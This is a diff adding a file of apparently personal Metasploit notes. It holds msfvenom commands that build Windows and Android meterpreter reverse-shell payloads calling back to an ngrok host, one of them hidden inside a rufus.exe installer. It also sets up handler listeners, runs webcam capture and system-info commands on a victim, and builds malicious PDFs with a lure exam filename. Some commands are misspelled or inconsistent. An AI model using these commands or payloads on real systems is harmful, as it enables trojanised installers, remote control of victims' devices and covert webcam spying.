@@ -1,0 +1,66 @@
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=16334 R > /storage/sdcard1/kali1/win.exe
+
+msfvenom -a x86  --platform andriod -p andriod/meterpreter/reverse_https -e x86/shikata_ga_nai -f apk LHOST=0.tcp.ngrok.io LPORT=11040 -o /root/power4.1.apk
+
+
+
+
+ use exploit/multi/handler
+msf exploit(handler) > set payload android/meterpreter/reverse_tcp
+payload => android/meterpreter/reverse_tcp
+msf exploit(handler) > set lhost 0.0.0.0
+lhost => 0.0.0.0
+msf exploit(handler) > set lport 3444
+lport => 4445
+msf exploit(handler) > exploit -j -z
+
+sysinfo
+
+webcam_snap -i 1 -v false
+
+
+use exploit/windows/fileformat/adobe_pdf_embedded_exe
+
+
+use exploit/windows/fileformat/adobe_toolbutton
+
+
+set FILENAME Artificial_Inteligence_finals_2016.pdf
+
+set payload windows/meterpreter/reverse_tcp
+
+set lhost localhost
+
+set lport 443
+
+exploit /root/.msf4/local/ejobs.pdf
+
+
+
+
+
+
+use exploit/multi/handler
+
+set payload windows/meterpreter/reverse_tcp
+
+set lhost <Your IP>
+
+set lport443
+
+exploit
+
+
+use exploit/andriod/fileformat/adobe_reader_pdf_js_interface
+
+exploit/android/fileformat/adobe_reader_pdf_js_interface
+
+
+  exploit/windows/fileformat/
+office_word_hta
+
+
+msfvenom  -x /storage/sdcard1/kali1/files/rufus.exe -p windows/x64/meterpreter/bind_tcp LHOST=0.tcp.ngrok.io LPORT=16219 -f exe-only > /storage/sdcard1/kali1/fRufus.exe
+
+
+
